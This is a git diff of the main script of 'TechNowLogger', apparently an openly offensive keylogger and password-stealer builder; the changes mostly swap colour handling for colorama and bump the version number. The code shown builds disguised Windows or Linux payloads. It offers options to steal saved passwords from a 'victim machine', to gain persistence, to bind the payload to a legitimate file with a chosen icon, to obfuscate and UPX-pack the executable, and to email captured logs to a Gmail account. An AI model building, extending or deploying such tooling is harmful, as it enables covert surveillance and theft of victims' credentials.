@@ -8,8 +8,9 @@ import banners
 import shutil
 from essential_generators import DocumentGenerator
 import platform
-
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+from colorama import init
+from colorama import Fore, Back, Style
+init()
 
 if platform.system() == 'Windows':
     AttackerPlatform = 'Windows'
@@ -19,18 +20,18 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.8')
-    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
+    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v1.9')
+    parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
-    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{RED}Supported OS : Windows{YELLOW}]", action='store_true')
+    parser.add_argument("-s", "--steal-password", dest="stealer", help=f"Steal Saved Password from Victim Machine [{Fore.RED}Supported OS : Windows{Fore.YELLOW}]", action='store_true')
     parser.add_argument("-b", "--bind", dest="bind", help="AutoBinder : Specify Path of Legitimate file.")
     parser.add_argument("-d", "--debug", dest="debug", help="Payload Will Run In Foreground with CMD Window, To get Appropriate Execution Error", action='store_true')
     
     
-    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
+    required_arguments = parser.add_argument_group(f'{Fore.RED}Required Arguments{Fore.GREEN}')
     required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
     required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
     required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
@@ -57,17 +58,17 @@ def get_python_pyinstaller_path():
     return python_path
 
 def check_dependencies():
-    print(f"{YELLOW}\n[*] Checking Dependencies...")
+    print(f"{Fore.YELLOW}\n[*] Checking Dependencies...")
     try:
         import mss, essential_generators, PyInstaller, pynput, six
         if platform.system() == 'Windows':
             import win32gui
-        print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
+        print(f"{Fore.GREEN}[+] All Dependencies are Installed on this system ;)\n")
     except Exception as e:
-        print(f"{RED}[!] Error : {e}")
+        print(f"{Fore.RED}[!] Error : {e}")
         try:
-            print(f"{YELLOW}[*] Installing All Dependencies From Scratch...\n")
-            print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
+            print(f"{Fore.YELLOW}[*] Installing All Dependencies From Scratch...\n")
+            print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
             import pip
             while 1:
                 pip.main(['install', 'mss==4.0.3'])
@@ -77,28 +78,28 @@ def check_dependencies():
                 pip.main(['install', 'six==1.12.0']) 
                 pip.main(['install', 'python-xlib==0.25'])
                 pip.main(['install', 'pywin32'])
-                print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
+                print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                 break
                 
         except AttributeError:
             print(f"Error : {e}")
-            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")        
-            print(f"{RED}\n[!] Try Running This command : python -m pip install --user --upgrade pip==9.0.3\n")
+            print(f"{Fore.RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")        
+            print(f"{Fore.RED}\n[!] Try Running This command : python -m pip install --user --upgrade pip==9.0.3\n")
             quit()
         
         except Exception as e:
-            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :( error: {e}\n")
+            print(f"{Fore.RED}\n[!] Unable to Install Dependencies, Please Try Again :( error: {e}\n")
             quit()
             
         try:
             import mss, essential_generators, PyInstaller, pynput, six, win32gui
             if platform.system() == 'Windows':
                 import win32gui
-            print(f"{GREEN}\n[+] Dependencies installed successfully ;)\n")
+            print(f"{Fore.GREEN}\n[+] Dependencies installed successfully ;)\n")
         except Exception as e:
-            print(f"{RED}[!] Unable To Install Dependencies | Error : {e}")
-            print(f"{YELLOW}[ X ] You Are Using Python {sys.version[:5]}")
-            print(f"{YELLOW}[ X ] Try to Install Python 3.7.4")
+            print(f"{Fore.RED}[!] Unable To Install Dependencies | Error : {e}")
+            print(f"{Fore.YELLOW}[ X ] You Are Using Python {sys.version[:5]}")
+            print(f"{Fore.YELLOW}[ X ] Try to Install Python 3.7.4")
             quit()        
 
 def create_keylogger(file_name, interval, email, password, time_persistent):
@@ -226,11 +227,11 @@ def pack_exe_using_upx():
         shutil.copy2(f"{os.getcwd()}\\upx\\upx.exe", f"{os.getcwd()}\\dist")
         os.chdir(f"{os.getcwd()}\\dist") 
         
-        print(f"{YELLOW}\n[*] Packing Exe Using UPX")
+        print(f"{Fore.YELLOW}\n[*] Packing Exe Using UPX")
         os.system(f"upx.exe {arguments.out}.exe > log.txt")
         os.remove("log.txt")
         os.remove("upx.exe")
-        print(f"{GREEN}[+] Packed Successfully !")
+        print(f"{Fore.GREEN}[+] Packed Successfully !")
 
 def del_junk_file(file_name):
     try:
@@ -254,7 +255,7 @@ def exit_greet():
         os.system('cls')
     except Exception as e:
         os.system('clear')        
-    print(GREEN + '''Thank You for using TechNowLogger, Think Great & Touch The Sky!  \n''' + END)
+    print(Fore.GREEN + '''Happy Hacking ~TechNowLogger!   \n''' + Style.RESET_ALL)
     quit()
     
 if __name__ == '__main__':
@@ -272,53 +273,54 @@ if __name__ == '__main__':
         
     try:
         print(banners.get_banner())
-        print(f"\t\t{YELLOW}Author: {GREEN}Pushpender | {YELLOW}GitHub: {GREEN}@PushpenderIndia\n")
+        print(f"\t\t{Fore.YELLOW}Author: {Fore.GREEN}Pushpender | {Fore.YELLOW}GitHub: {Fore.GREEN}@PushpenderIndia\n")
 
         arguments = get_arguments()       
         
         if arguments.icon == None:
-            arguments.icon = input(f'{RED}[!] Please Specify Icon Path {WHITE}[{GREEN}LEAVE BLANK to SET icon/exe.ico as icon{WHITE}] : ')
+            arguments.icon = input(f'{Fore.RED}[!] Please Specify Icon Path {Fore.WHITE}[{Fore.GREEN}LEAVE BLANK to SET icon/exe.ico as icon{Fore.WHITE}] : ')
             if arguments.icon == "":
                 arguments.icon = "icon/exe.ico"      
 
         if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
             WINDOWS_PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
             if WINDOWS_PYTHON_PYINSTALLER_PATH == "UnableToFind":
-                print(f'{RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
-                print(f'{RED}[!] {WHITE}[Please Update Line 19 Later] [{RED}DefautPath: {WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
+                print(f'{Fore.RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
+                print(f'{Fore.RED}[!] {Fore.WHITE}[Please Update Line 19 Later] [{Fore.RED}DefautPath: {Fore.WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
                 WINDOWS_PYTHON_PYINSTALLER_PATH = "wine "
-                WINDOWS_PYTHON_PYINSTALLER_PATH += input(f'\n{WHITE}[?] Enter pyinstaller.exe path manually : ')
+                WINDOWS_PYTHON_PYINSTALLER_PATH += input(f'\n{Fore.WHITE}[?] Enter pyinstaller.exe path manually : ')
 
-        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
-        print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
-        print(f'   {YELLOW}Password:{RED} ' + arguments.password) 
-        print(f'   {YELLOW}Log\'s Send Interval:{RED} Every ' + str(arguments.interval) + ' seconds')
-        print(f'   {YELLOW}Becomes Persistence After:{RED} ' + str(arguments.time_persistent) + ' seconds')
-        print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out) 
-        print(f'   {YELLOW}Icon Path:{RED} ' + arguments.icon)
+        print(f'\n{Fore.GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{Fore.GREEN}')
+        print(f'\n   {Fore.YELLOW}Email:{Fore.RED} ' + arguments.email)
+        print(f'   {Fore.YELLOW}Password:{Fore.RED} ' + arguments.password) 
+        print(f'   {Fore.YELLOW}Log\'s Send Interval:{Fore.RED} Every ' + str(arguments.interval) + ' seconds')
+        print(f'   {Fore.YELLOW}Becomes Persistence After:{Fore.RED} ' + str(arguments.time_persistent) + ' seconds')
+        print(f'   {Fore.YELLOW}Output Evil File Name:{Fore.RED} ' + arguments.out) 
+        print(f'   {Fore.YELLOW}Icon Path:{Fore.RED} ' + arguments.icon)
+        print(f'   {Fore.YELLOW}Pyinstaller Path:{Fore.RED} ' + WINDOWS_PYTHON_PYINSTALLER_PATH + f" {Fore.YELLOW}[{Fore.WHITE}Manually Update line: 19 & 22, If this PATH is Incorrect{Fore.YELLOW}]")
         
         if arguments.bind != None:
-            print(f'   {YELLOW}Binding To [{RED}Legitimate File Path{YELLOW}]:{RED} ' + str(arguments.bind))
+            print(f'   {Fore.YELLOW}Binding To [{Fore.RED}Legitimate File Path{Fore.YELLOW}]:{Fore.RED} ' + str(arguments.bind))
             
-        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
+        print(f'\n{Fore.GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
         
-        ask = input(f'\n{WHITE}[?] Are the above mentioned credentials correct? (y/n) : ')
+        ask = input(f'\n{Fore.WHITE}[?] Are the above mentioned credentials correct? (y/n) : ')
     
         if ask.lower() == 'y':
             pass
         else:
             arguments.email = input('\n[?] Type your gmail to receive logs: ')
             arguments.password = input('[?] Type your gmail password: ')
-            arguments.interval = int(input(f'[?] Time interval to send logs; [{RED}In Seconds{WHITE}]: '))
-            arguments.time_persistent = int(input(f'[?] Time after to become persistence; [{RED}In Seconds{WHITE}]: '))   
+            arguments.interval = int(input(f'[?] Time interval to send logs; [{Fore.RED}In Seconds{Fore.WHITE}]: '))
+            arguments.time_persistent = int(input(f'[?] Time after to become persistence; [{Fore.RED}In Seconds{Fore.WHITE}]: '))   
             arguments.out = input('[?] Output Evil File Name: ')  
-            arguments.icon = input(f'[?] Icon Path [{RED}If Present In This Directory, then just type Name{WHITE}]: ')  
+            arguments.icon = input(f'[?] Icon Path [{Fore.RED}If Present In This Directory, then just type Name{Fore.WHITE}]: ')  
             if arguments.bind != None:
-                arguments.bind = input(f'[?] Path of Legitimate File [{RED}.exe is Recommended{WHITE}]: ')
+                arguments.bind = input(f'[?] Path of Legitimate File [{Fore.RED}.exe is Recommended{Fore.WHITE}]: ')
 
         check_dependencies()
 
-        print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")
+        print(f"\n{Fore.YELLOW}[*] Generating Please wait for a while...{Fore.MAGENTA}\n")
 
         if arguments.windows:
             if arguments.bind == '' or arguments.bind == None:
@@ -333,7 +335,7 @@ if __name__ == '__main__':
         encrypting_code = encrypt_code.Encrypt()
         encrypting_code.encrypt(arguments.out)
 
-        print(f"{MAGENTA}")
+        print(f"{Fore.MAGENTA}")
 
         if AttackerPlatform == 'Windows':
             if arguments.bind == None or arguments.bind == "":
@@ -352,24 +354,24 @@ if __name__ == '__main__':
                 compile_for_linux(arguments.out, arguments.icon)  
 
             else:
-                print(f"{RED}[!] Please Specify {YELLOW}-w{RED} for {GREEN}WINDOWS{RED} or {YELLOW}-l{RED} for {GREEN}LINUX{RED} payload generation")
+                print(f"{Fore.RED}[!] Please Specify {Fore.YELLOW}-w{Fore.RED} for {Fore.GREEN}WINDOWS{Fore.RED} or {Fore.YELLOW}-l{Fore.RED} for {Fore.GREEN}LINUX{Fore.RED} payload generation")
 
-        print(f"\n{YELLOW}[*] Deleting Junk Files...")
+        print(f"\n{Fore.YELLOW}[*] Deleting Junk Files...")
         del_junk_file(arguments.out)
-        print(f"{GREEN}[+] Junk Files Removed Successfully!")
+        print(f"{Fore.GREEN}[+] Junk Files Removed Successfully!")
         
         if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/technowloogger/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
-            print(f"\n{GREEN}[+] Generated Successfully!\n")
+            print(f"\n{Fore.GREEN}[+] Generated Successfully!\n")
 
             pack_exe_using_upx()
             
-            print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
-            print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
-            print(f"\n{RED} :O-) TIP{YELLOW} : USE ICONS from {RED}icon{YELLOW} folder like this >>  {RED}--icon icon/exe.ico")
+            print(f"\n\n{Fore.RED}[***] Don't forget to allow less secure applications in your Gmail account.")
+            print(f"{Fore.GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")
+            print(f"\n{Fore.RED} :O-) TIP{Fore.YELLOW} : USE ICONS from {Fore.RED}icon{Fore.YELLOW} folder like this >>  {Fore.RED}--icon icon/exe.ico")
 
         else:
-            print(f"\n{RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
-            print(f"\n{GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowlogger\n")                  
+            print(f"\n{Fore.RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
+            print(f"\n{Fore.GREEN}[:D] Please Contact us on https://github.com/PushpenderIndia/technowlogger\n")                  
     
     except KeyboardInterrupt:        
         exit_greet()
